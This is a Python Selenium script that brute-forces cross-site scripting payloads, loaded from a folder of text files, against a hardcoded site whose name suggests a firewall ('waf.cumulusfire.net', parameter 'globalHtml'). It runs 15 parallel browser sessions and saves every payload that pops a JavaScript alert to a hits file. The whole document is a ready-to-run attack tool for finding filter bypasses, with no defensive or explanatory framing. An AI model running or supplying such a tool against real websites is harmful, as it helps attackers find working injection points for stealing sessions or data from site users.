import urllib.parse
import os
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, NoAlertPresentException
import time

# -------- Config -------- #
PAYLOAD_FOLDER = "payload_chunks"
TARGET_URL_BASE = "https://waf.cumulusfire.net/?globalHtml="
MAX_THREADS = 15

# -------- Load All Payloads from Folder -------- #
def load_payloads_from_folder(folder: str):
    payloads = []
    for filename in os.listdir(folder):
        if filename.endswith(".txt"):
            full_path = os.path.join(folder, filename)
            with open(full_path, "r", encoding="utf-8") as f:
                payloads.extend([line.strip() for line in f if line.strip()])
    return payloads

# -------- Setup Headless Browser -------- #
chrome_options = Options()
#chrome_options.add_argument("--headless")
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--log-level=3")

# -------- Payload Testing Function -------- #
def test_payload(payload):
    encoded = urllib.parse.quote(payload)
    url = TARGET_URL_BASE + encoded

    driver = webdriver.Chrome(options=chrome_options)
    driver.set_page_load_timeout(10)

    try:
        driver.get(url)
        time.sleep(1)  # Give JS time to execute

        try:
            alert = driver.switch_to.alert
            alert_text = alert.text
            alert.accept()
            print(f"[✔] XSS Executed! Payload: {payload}")
            with open("xss_hits_selenium.txt", "a", encoding="utf-8") as out:
                out.write(payload + "\n")
        except NoAlertPresentException:
            print(f"[✗] No alert for: {payload}")

    except TimeoutException:
        print(f"[!] Timeout on payload: {payload}")
    except Exception as e:
        print(f"[!] Error on payload {payload}: {e}")
    finally:
        driver.quit()

# -------- Run Scanner -------- #
if __name__ == "__main__":
    print(f"[*] Loading payloads from folder: {PAYLOAD_FOLDER}")
    payloads = load_payloads_from_folder(PAYLOAD_FOLDER)
    print(f"[+] Loaded {len(payloads):,} payloads. Starting XSS test...")

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(test_payload, payloads)

    print("[*] Done. Executed payloads saved in xss_hits_selenium.txt.")

